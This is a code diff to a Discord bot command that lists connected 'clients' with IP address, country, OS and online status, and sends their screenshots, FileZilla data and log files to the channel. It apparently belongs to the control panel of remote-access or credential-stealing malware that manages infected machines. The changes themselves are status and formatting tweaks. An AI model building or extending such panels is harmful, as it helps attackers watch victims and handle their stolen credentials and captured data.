@@ -14,10 +14,19 @@ exports.run = (client, message, args) => {
                 let fields = [];
 
                 for (const [index, element] of results.reverse().entries()) {
+                    let expDate = new Date();
+                    expDate.setTime(expDate.getTime() - 5 * 60 * 1000);
+                    const formattedDate =
+                        element.updatedAt > expDate ? "Online" : "Offline";
+
                     fields.push({
                         name: !element.tag ? "No tag" : element.tag,
                         value: `
                             **ID**: ${element.id}
+                            **Status**: ${formattedDate}
+                            **Last connection**: \n${moment(
+                                element.updatedAt
+                            ).format("YYYY-MM-DD HH:mm:ss")}
                             **IP Address**: ${element.ipAddress}
                             **Country**: ${element.country}
                             **OS**: ${element.operatingSystem}
@@ -32,8 +41,7 @@ exports.run = (client, message, args) => {
                     ) {
                         const embed = new Discord.MessageEmbed()
                             .setColor("#0099ff")
-                            .addFields(fields)
-                            .setTimestamp();
+                            .addFields(fields);
 
                         pages.push(embed);
                         fields = [];
@@ -106,9 +114,10 @@ exports.run = (client, message, args) => {
 
                 const filezillaLength = filezillaData.length;
 
-                const formattedDate = moment(element.updatedAt).format(
-                    "YYYY-MM-DD HH:mm:ss"
-                );
+                let expDate = new Date();
+                expDate.setTime(expDate.getTime() - 5 * 60 * 1000);
+                const formattedDate =
+                    element.updatedAt > expDate ? "Online" : "Offline";
 
                 const embed = new Discord.MessageEmbed()
                     .setColor("#0099ff")
@@ -116,7 +125,7 @@ exports.run = (client, message, args) => {
                         name: !element.tag ? "No tag found" : element.tag,
                         value: `
                             **ID**: ${element.id}
-                            **Last seen**: ${formattedDate}
+                            **Status**: ${formattedDate}
                             **IP Address**: ${element.ipAddress}
                             **Country**: ${element.country}
                             **Region**: ${element.region}
@@ -136,7 +145,11 @@ exports.run = (client, message, args) => {
                     .setThumbnail(
                         `https://www.countryflags.io/${element.countryCode}/flat/64.png`
                     )
-                    .setTimestamp();
+                    .setFooter(
+                        `Last connection: ${moment(element.updatedAt).format(
+                            "YYYY-MM-DD HH:mm:ss"
+                        )}`
+                    );
 
                 if (fs.existsSync(screenShotPath)) {
                     const attachment = new Discord.MessageAttachment(
@@ -327,21 +340,19 @@ exports.run = (client, message, args) => {
                 },
             }).then(async (result) => {
                 if (result.length > 0) {
-                    const logPath = "./server/logs/" + result[0].identifier + ".txt";
+                    const logPath =
+                        "./server/logs/" + result[0].identifier + ".txt";
                     if (fs.existsSync(logPath)) {
                         message.channel.send(
-                            new Discord.MessageAttachment(
-                                logPath,
-                                "logs.txt"
-                            )
+                            new Discord.MessageAttachment(logPath, "logs.txt")
                         );
                     } else {
-                        message.channel.send("Logs not found")
+                        message.channel.send("Logs not found");
                     }
                 } else {
                     message.channel.send("Client not found");
                 }
-            })
+            });
         } else {
             message.channel.send("Invalid argument");
         }
